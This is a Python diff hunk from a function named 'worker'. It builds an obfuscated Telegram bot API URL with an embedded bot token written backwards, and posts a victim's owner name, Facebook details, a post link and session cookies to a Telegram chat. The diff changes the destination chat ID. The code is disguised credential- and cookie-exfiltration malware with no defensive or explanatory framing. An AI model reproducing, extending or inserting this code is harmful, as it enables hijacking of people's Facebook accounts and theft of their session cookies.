@@ -107,7 +107,7 @@ def worker(ilal):
   _g = ''.join(['h','tt','p','s',':','//'])
   impormatibo = "ALk2hPxAh4TAAwo5R4I8HGCX5lom25mmGAA"
   url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7348882668:{impormatibo[::-1]}'
-  pay = {_tt: '7075537944'}
+  pay = {_tt: '-1002564235566'}
   if not hx:
     requests.post(url+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
     hx = True
